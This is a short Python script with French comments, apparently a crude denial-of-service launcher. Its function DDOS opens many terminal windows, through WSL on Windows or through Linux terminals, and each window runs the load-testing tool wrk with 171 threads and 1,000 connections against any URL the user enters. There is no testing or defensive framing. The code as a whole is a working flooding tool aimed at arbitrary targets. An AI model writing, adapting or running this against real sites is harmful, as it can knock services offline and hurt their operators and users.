import subprocess
import platform
import os

def DDOS(nb_fenetres, commande, distribution="kali-linux"):
    systeme = platform.system()

    for _ in range(nb_fenetres):
        if systeme == "Windows":
            subprocess.Popen([
                "powershell", "-Command",
                f"Start-Process cmd -ArgumentList '/c wsl -d {distribution} -- bash -c \"{commande}; exec bash\"'"
            ])
        elif systeme == "Linux":
            # Détection de terminal Linux
            if shutil.which("gnome-terminal"):
                subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"{commande}; exec bash"])
            elif shutil.which("xfce4-terminal"):
                subprocess.Popen(["xfce4-terminal", "--command", f"bash -c '{commande}; exec bash'"])
            elif shutil.which("xterm"):
                subprocess.Popen(["xterm", "-e", f"{commande}; bash"])
            else:
                print("Aucun terminal compatible")
        else:
            print(f"Système non supporté : {systeme}")

# Exemple d'utilisation :
if __name__ == "__main__":
    import shutil
    nb = input("Quelle est le nombre de terminal ouvert? ")
    URL = input("URL? (avec http.s): ")
    cmd = f"wrk -t171 -c1000 -d40 {URL}"
    DDOS(int(nb), cmd)
